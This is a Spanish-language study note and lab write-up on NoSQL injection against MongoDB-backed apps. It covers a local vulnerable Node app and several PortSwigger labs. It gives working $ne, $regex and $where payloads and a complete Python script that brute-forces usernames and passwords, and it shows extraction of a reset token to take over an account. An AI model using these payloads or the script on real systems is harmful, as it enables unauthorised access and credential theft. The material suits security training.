---
aliases:
  - NoSQL Injection
  - Inyección NoSQL
tags:
  - hacking/explotacion
  - hacking/web
  - programacion/python
  - herramientas/burpsuite
  - hacking/laboratorios
estado: 🟢 Terminado
---
Las **inyecciones NoSQL** son una vulnerabilidad de seguridad en las aplicaciones web que utilizan bases de datos NoSQL, como MongoDB, Cassandra y CouchDB, entre otras. Estas inyecciones se producen cuando una aplicación web permite que un atacante envíe datos maliciosos a través de una consulta a la base de datos, que luego puede ser ejecutada por la aplicación sin la debida validación o sanitización.

La inyección NoSQL funciona de manera similar a la inyección SQL, pero se enfoca en las vulnerabilidades específicas de las bases de datos NoSQL. En una inyección NoSQL, el atacante aprovecha las consultas de la base de datos que se basan en **documentos** en lugar de tablas relacionales, para enviar datos maliciosos que pueden manipular la consulta de la base de datos y obtener información confidencial o realizar acciones no autorizadas.

A diferencia de las inyecciones SQL, las inyecciones NoSQL explotan la falta de validación de los datos en una consulta a la base de datos NoSQL, en lugar de explotar las debilidades de las consultas SQL en las **bases de datos relacionales**.

A continuación, se proporciona el enlace al proyecto de Github que nos descargamos para poner en práctica esta vulnerabilidad:

- **Vulnerable-Node-App**: [https://github.com/Charlie-belmer/vulnerable-node-app](https://github.com/Charlie-belmer/vulnerable-node-app)

## Notas de la práctica

Una vez la máquina desplegada, procederemos a explorar la siguiente aplicación web:

![[Pasted image 20250826113225.png]]

Existe otra opción, `User Lookup`, que aparentemente permite buscar usuarios:

![[Pasted image 20250826113304.png]]

Listaremos algunos usuarios conocidos:

![[Pasted image 20250826113520.png]]
Observamos que proporciona información básica del usuario y su rol.

![[Pasted image 20250826113602.png]]

En este panel, podríamos intentar una [[SQL Injection|SQLI]], pero no es el objetivo de esta práctica.

Consultaremos la web de PayloadsAllTheThings para NoSQL Injection (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection) para revisar algunos ejemplos de inyecciones NoSQL:

![[Pasted image 20250826113743.png]]

Como podemos observar, el objetivo es evadir los paneles de autenticación mediante condiciones específicas, independientemente de si los datos se envían en formato JSON o no. Intentaremos este tipo de ataque con la ayuda de Burp Suite para facilitar el proceso:

![[Pasted image 20250826114036.png]]

Se observa que los datos se envían mediante una solicitud `POST` en formato `JSON`, como indica el `Content-Type`. Dado que no podemos utilizar [[SQL Injection|SQLI]], procederemos a intentar inyecciones NoSQL:

![[Pasted image 20250826114232.png]]

En este caso, agregamos una estructura donde especificamos `password: {"$ne (no igual)", "admin1234"}`. Observamos la respuesta del servidor:

> [!info] Explicación de `$ne`
> El operador `$ne` (not equal) en MongoDB se utiliza para seleccionar documentos donde el valor del campo no es igual al valor especificado. En este contexto, `{"password": {"$ne": "admin1234"}}` significa "seleccionar cualquier documento donde el campo `password` no sea `admin1234`". Esto es útil para bypass de autenticación si la aplicación no valida correctamente la entrada, permitiendo que cualquier contraseña diferente a la especificada (o incluso una no existente) satisfaga la condición.

![[Pasted image 20250826114342.png]]

Confirmamos que logramos el bypass.

Ahora, supongamos que no conocemos ni el `usuario` ni la `contraseña`. El procedimiento sería similar:
![[Pasted image 20250826114514.png]]

En este caso, nos permite acceder como `guest`.

Esto es útil, pero como atacantes, nuestro interés principal es obtener información de todos los usuarios en general. Esto se puede lograr de la siguiente manera:
![[Pasted image 20250826114833.png]]

Podemos utilizar expresiones regulares (regex) para obtener información de diferentes usuarios a través de la respuesta. Como se observa, al usar `g`, automáticamente se nos permite acceder como un usuario cuyo nombre comienza con la letra 'g'. Este método se puede extender para completar el nombre de usuario completo, letra por letra, hasta obtenerlo por completo:

> [!tip] Inyección NoSQL con Regex
> Las inyecciones NoSQL que utilizan expresiones regulares (`$regex`) son particularmente potentes para la enumeración de datos. Al construir una regex como `^<caracteres_conocidos><siguiente_caracter_a_adivinar>`, se puede realizar un ataque de fuerza bruta carácter por carácter para descubrir nombres de usuario, contraseñas o cualquier otro campo textual. La respuesta de la aplicación (éxito o fallo de autenticación) actúa como un oráculo para confirmar si el carácter adivinado es correcto.

![[Pasted image 20250826115041.png]]

Como se observa, siempre que una parte de la expresión regular sea correcta, logramos un ingreso exitoso.

Con esta técnica, podemos proceder a realizar un ataque de fuerza bruta para componer los nombres de usuario y, de manera similar, las contraseñas.

Podemos determinar la longitud total de las contraseñas utilizando expresiones regulares de la siguiente forma:

![[Pasted image 20250826120126.png]]
donde si el valor es exacto o mayor nos permite pasar, pero si es menor nos dará un error.

> [!warning] Determinación de Longitud con Regex
> Para determinar la longitud de una contraseña usando `$regex`, se puede emplear `.{N}` donde `N` es la longitud. Si la consulta `{"password": {"$regex": ".{N}"}}` devuelve un resultado positivo, significa que la contraseña tiene al menos `N` caracteres. Iterando `N` desde 1 y observando cuándo la respuesta cambia de éxito a fallo, se puede inferir la longitud exacta. Por ejemplo, si `.{10}` funciona y `.{11}` falla, la longitud es 10.

A continuación, desarrollaremos un script en Python para automatizar este proceso:

```python
#!/usr/bin/python3

from pwn import *
import requests, time, sys, signal,string

from six import iteritems

# CTRL+C
def def_handler(sig, frem):
    print("\n[!] Saliendo.....\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global Var
login_url="http://localhost:4000/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def uncoverLetter():

    userLetterList = []
    for character1 in characters:
        post_data  = '{"username":{"$regex":"^%s"},"password":{"$ne":"1234"}}' % (character1)
        headers = {"Content-Type": "application/json"}

        r = requests.post(login_url,headers=headers, data=post_data)


        if "Logged in as user" in r.text:

                for character2 in characters:
                    inituser=""
                    post_data  = '{"username":{"$regex":"^%s%s"},"password":{"$ne":"1234"}}' % (character1,character2)
                    headers = {"Content-Type": "application/json"}

                    r = requests.post(login_url,headers=headers, data=post_data)

                    if "Logged in as user" in r.text:
                        inituser=character1+character2
                        userLetterList.append(inituser)

    return userLetterList



def uncoverLeng(user):


    for leng in range(1, 50):
        post_data  = '{"username":"%s","password":{"$regex":".{%d}"}}' % (user,leng)
        headers = {"Content-Type": "application/json"}

        r = requests.post(login_url,headers=headers, data=post_data)

        if "Logged in as user" not in r.text:
            return leng-1



def uncoverUsername(init):

    print("\nDiscovery Users\n")

    p1 = log.progress("Fuerza Bruta")
    p2 = log.progress("User")


    username=init
    for position in range(1, 15):
        for character in characters:
            post_data  = '{"username":{"$regex":"^%s%s"},"password":{"$ne":"null"}}' % (username ,character)

            headers = {"Content-Type": "application/json"}

            p1.status(post_data)

            r = requests.post(login_url, headers=headers, data=post_data)

            if "Logged in as user" in r.text:
                username += character
                p2.status(username)
                break
    p1.success()
    p2.success()
    os.system("clear")
    return username

def uncoverPassword(users):

    usersAndpassword = {}

    p1 = log.progress("User")
    p2 = log.progress("Password")

    for user in users:
        passoword = ""
        length = uncoverLeng(user)
        p1.status(user)
        for position in range(1, length):
            for character in characters:
                post_data  = '{"username":"%s","password":{"$regex":"^%s%s"}}' % (user,passoword,character)
                headers = {"Content-Type": "application/json"}

                r = requests.post(login_url, headers=headers, data=post_data)


                if "Logged in as user" in r.text:
                    passoword+=character
                    p2.status(passoword)
                    break
        usersAndpassword[user] = passoword
    return usersAndpassword



def main():
    os.system("clear")
    users = []
    letters = uncoverLetter()
    for letter in letters:
        users.append(uncoverUsername(letter))

    print("[+] Users: \n")
    for user in users:
        print("-" + user)

    print("\n Discovery Passswords\n")
    listCredentials = uncoverPassword(users)

    time.sleep(2)
    os.system("clear")

    print("\n[+] List Credentials\n")

    for user, password in listCredentials.items():
        print("[+] User: " + user)
        print("[+] Password: " + password  + "\n")


if __name__ == '__main__':
    main()
```

El resultado de la ejecución del script se vería de la siguiente manera:

![[Pasted image 20250826155339.png]]

## PortSwigger

### Detecting NoSQL injection

Bueno nosotros vamos a comenzar detectando si se puede hacer una inyección de forma similar a una SQL Inyection de la siguiente manera:

![[Pasted image 20260312181538.png]]

como observamos se esta filtrando por Accessories pero al insertarse la `'` se rompe y si leemos un poco nos habla de mongohelpers. Esto ya nos dice que esta empleando mongodb por detrás y al tener código JavaScript mal formado pues no lo logra y da el error.

Entonces conociendo que emplea JavaScript y MongoDB podemos intentar jugar con operadores lógicos para que nos liste por todos los productos de la siguiente manera:

![[Pasted image 20260312182127.png]]

como vemos el primer `'||` lo que hace es serrar el string del valor a filtrar y fijar un or, luego el valor de  `true` es el que se acepta recordemos que `Accessories` no llega como true sino como una variante, podemos decir que un encontrado mas no un `true` puro el segundo `true` es el que se interpreta y recordando que en un or si el primer valor es `true` el segundo se omite pues omitimos la comilla o el vacío sobrante, tenemos que tomar en cuenta que esto posiblemente es valido porque se implementa `$where`.

Lab terminado.

### Exploiting NoSQL operator injection to bypass authentication

Ahora tenemos que conectarnos como el usuario administrador mediante una NoSQL.

![[Pasted image 20260312183016.png]]

Como observamos capturamos una petición de inicio de sesión la cual tramita datos en JSON y bueno esto me da una cookie de sesión.

Por detrás nos avisan que corre MongoDB y con esto podemos comenzar probando las conocidas `Exprecioens de Operador` donde podemos hacer lo siguiente:

![[Pasted image 20260312183255.png]]

Como podemos observar mediante `regex` podemos de alguna forma obtener usuarios mediante fuerza bruta y uno puede pensar que en la contraseña igual, pero y si para facilitar esto mas usamos `ne` que es no equals  por lo que podemos intentarlo:

![[Pasted image 20260312183555.png]]

como vemos es valido, como la contraseña no es la correcta pues no hace valido y pasa, vamos a intentarlo con el usuario administrador para ver que sucede:

![[Pasted image 20260312183642.png]]

Como observamos esto es valido por lo tanto tenemos una cookie valida a usar para pasar a ser administrador:

![[Pasted image 20260312183740.png]]

Lab Terminado.

### Exploiting NoSQL injection to extract data

Bueno al parecer tenemos que obtener información mediante una NoSQL por lo tanto vamos a ver como se puede hacer.

Nos dan un usuario y contraseña así que vamos a ingresar con las credenciales que nos dan.

![[Pasted image 20260312184715.png]]

La información encerrada al parecer demora en cargar o es lo ultimo que carga por lo que vemos así que tiene que estarse insertando de alguna forma alterna y como todo el trafico esta pasando en BurpSuite vamos a buscar la petición que lo hace:

![[Pasted image 20260312184857.png]]

Como podemos observar esta petición es la que nos permite obtener mas información de la que se debería.

En este caso podemos hacer la misma inyección que usamos en uno de los laboratorios anteriores con `||` 'or' podemos intentar que se liste mas información:

![[Pasted image 20260312185059.png]]

Como podemos observar vemos mas información de la que se supone que deberíamos.

Ahora ya conocemos el usuario que es `administrator` por lo tanto podemos intentar mas cosas como intentar ver la longitud que tiene la contraseña del usuario `administrator`:

![[Pasted image 20260312185550.png]]

bueno tomamos en cuenta que `this.password.length` hace referencia a la clase objeto actual con la que se trabaja por tanto lo que si se debe verificar es el nombre de la variable porque puede ser `pass, passwd, etc..`.

En este caso vemos que si la contraseña es menor a 10 si ponemos por ejemplo 3 vamos a ver un error debido a que la condición lógica `&&` pide que se cumplan ambas y si no es así pues no es valido:

![[Pasted image 20260312185754.png]]

ya con esto podemos ir buscando la longitud exacta de la contraseña:

![[Pasted image 20260312185911.png]]

Como podemos observar es de 8 caracteres, por lo tanto ya podemos intentar ir buscando los caracteres válidos para dicha contraseña uno a uno de la siguiente manera:

![[Pasted image 20260312190105.png]]

esto de forma manual es algo complicado y podemos hacer uso del Intruder o simplemente del Python crearnos un script, en este caso utilizaremos el intruder:

![[Pasted image 20260312190309.png]]

configuramos todo he intentamos atacar:

![[Pasted image 20260312190521.png]]

lo que hacemos es filtrar por la longitud, recordemos que las invalidas todas tendrán lo mismo y las validas todas tendrán lo mismo por lo tanto ya tenemos la contraseña, iniciemos sesión:

![[Pasted image 20260312190700.png]]

Lab Terminado.

### Exploiting NoSQL operator injection to extract unknown fields

En este laboratorio tenemos que intentar extraer campos desconocidos y el objetivo es conectarnos como Carlos.


Bueno al parecer la inyección se da exactamente al resetear la contraseña donde introducimos el email o el usuario para que nos envíen el link con el cual restablecer dicha contraseña:

![[{20AD9856-557B-4A88-BA71-4E9F843173D0}.png]]

Bueno vamos capturar esta petición para ver como se tramita:

![[Pasted image 20260312191811.png]]

Bueno vemos que tenemos la petición y es valida, su estructura que no es JSON como se acostumbra, vemos como se tramita ahora el iniciar sesión:

![[Pasted image 20260312192127.png]]

como observamos esta estructura si es mucho mas correspondiente con una servidor NoSQL por lo tanto vamos a intentar evadir la contraseña como ya sabemos:

![[Pasted image 20260312192231.png]]

vemos que nos pide un cambio de contraseña, bueno podemos intentar integrar la expresión `$where` de la siguiente manera:
![[Pasted image 20260312192425.png]]

vemos que nos cambia por alguna ranzón lo de cuenta bloqueada y es que el `where` cuando tiene el valor de 0 -> false, lo que hace es descartar los demás valores de la query a sí estos sean validos. Por esto es que si cambiamos a 1 -> true vamos a ver como nuevamente el mensaje es de cuenta bloqueada debido a que se interpreta el resto de documentos:

![[Pasted image 20260312192645.png]]

Lo que en realidad importa es que nos esta interpretando la información por lo que podríamos hacer muchas cosas como intentar obtener a trozos la contraseña.

Bueno en este caso recordemos el primer apartado que envía un correo con el token que si es valido nos permite cambiar la contraseña. Lo que vamos a hacer es enumerar campos mediante la expresión `where` de la siguiente manera:

![[Pasted image 20260312193410.png]]

bueno la expresión es necesario comprenderla y es que con `object.keys(this)` estamos enumerando todos los valores con respecto a la clase objeto actual en ejecución donde para el array porque eso retorna un array, en su posición `0` tenga `.match('')` busque lo que sea y en este caso `^.{0}a.*` le decimos que para el valor que comienza en la posición `0` y es el valor `a` y luego lo que sea, el punto es hacer un ataque de fuerza bruta con Intruder para ir encontrado en cada posición un carácter que permita armar estos campos de a poco de la siguiente manera:

![[Pasted image 20260312194018.png]]

bueno con esto podemos intentar filtrar por longitud de repuesta y veremos:

![[Pasted image 20260312194115.png]]

Como observamos en este caso el campo es `id` por lo tanto de esta forma podemos ir obteniendo los campos:

![[Pasted image 20260312194426.png]]

bueno para el cuarto campo tenemos uno llamado `resetPwdToken` por lo cual jugando con el mismo principio vamos a ver que nos responde pasándolo a `where`:

![[Pasted image 20260312194746.png]]

con la expresión correctamente armada vamos a ver si es que logramos mediante el Intruder obtener su valor completo:

![[Pasted image 20260312194848.png]]

Como podemos observar es cuestión de atacar y ver el resultado mediante su longitud:

![[Pasted image 20260312195012.png]]

como vemos la cadena es `aa20daad9f302b09` y vamos a utilizar esto para cambiarle la contraseña al usuario carlos:

![[Pasted image 20260312195157.png]]

como observamos tenemos el panel y vamos a cambiarle la contraseña:

![[Pasted image 20260312195237.png]]

Lab Terminado.